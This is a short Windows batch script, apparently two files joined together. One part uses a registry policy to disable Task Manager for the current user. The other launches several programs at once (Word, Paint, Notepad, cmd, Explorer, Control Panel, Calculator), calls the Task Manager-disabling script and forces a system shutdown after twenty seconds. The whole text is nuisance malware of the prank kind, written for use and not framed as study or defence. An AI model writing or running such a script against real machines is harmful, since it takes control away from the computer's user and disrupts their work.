@echo off
echo Disabling Task Manager for current user...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo Task Manager has been disabled.

@echo off

start winword
start mspaint
start notepad
start cmd
start explorer
start control
start calc

start taskmgrDisable.bat

shutdown /s /t20


